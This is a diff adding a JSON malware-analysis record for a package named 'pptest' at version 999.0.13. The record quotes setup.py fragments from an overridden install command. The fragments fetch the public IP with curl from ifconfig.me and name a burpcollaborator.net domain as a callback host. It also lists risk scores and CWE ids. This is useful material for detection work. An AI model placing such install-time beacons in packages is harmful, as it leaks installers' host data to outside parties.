@@ -1,0 +1,48 @@
+{
+  "package_metadata": {
+    "name": "pptest",
+    "version": "999.0.13",
+    "author_email": "testtt@google.com"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "http://ifconfig.me/ip",
+      "http://ip.dhcp.cn/?json",
+      "hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net"
+    ],
+    "process_spawns": [
+      "curl -s \"http://ifconfig.me/ip\""
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "public_ip = os.system('curl -s \"http://ifconfig.me/ip\"')"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "This package is overwriting the 'install' command in setup.py"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
